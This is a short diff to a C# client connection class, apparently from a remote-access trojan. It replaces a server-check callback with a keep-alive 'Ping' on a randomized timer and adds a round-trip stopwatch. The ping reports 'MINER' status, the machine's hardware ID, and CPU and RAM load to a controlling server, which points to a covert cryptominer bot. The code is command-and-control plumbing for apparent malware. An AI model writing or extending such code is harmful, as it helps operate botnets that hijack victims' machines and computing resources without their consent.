@@ -30,6 +30,7 @@ namespace Client.Connection
         private static MemoryStream MS { get; set; }
         public static bool IsConnected { get; set; }
         private static object SendSync { get; } = new object();
+        public static Stopwatch Pong { get; set; }
 
         public static void InitializeClient()
         {
@@ -89,7 +90,8 @@ namespace Client.Connection
                     Buffer = new byte[4];
                     MS = new MemoryStream();
                     Send(IdSender.SendInfo());
-                    Tick = new Timer(new TimerCallback(CheckServer), null, new Random().Next(15 * 1000, 30 * 1000), new Random().Next(15 * 1000, 30 * 1000));
+                    Tick = new Timer(new TimerCallback(KeepAlivePacket), null, new Random().Next(15 * 1000, 30 * 1000), new Random().Next(15 * 1000, 60 * 1000));
+                    Pong = new Stopwatch();
                     SslClient.BeginRead(Buffer, 0, Buffer.Length, ReadServertData, null);
                 }
                 else
@@ -235,14 +237,15 @@ namespace Client.Connection
             }
         }
 
-        public static void CheckServer(object obj)
+        public static void KeepAlivePacket(object obj)
         {
             MsgPack msgpack = new MsgPack();
             msgpack.ForcePathObject("Packet").AsString = "Ping";
             msgpack.ForcePathObject("Message").AsString = $"MINER {SetRegistry.GetValue(Settings.Hwid) ?? "0"}   CPU {(int)IdSender.TheCPUCounter.NextValue()}%   RAM {(int)IdSender.TheMemCounter.NextValue()}%";
             Send(msgpack.Encode2Bytes());
+            Pong.Reset();
+            Pong.Start();
             GC.Collect();
         }
-
     }
 }
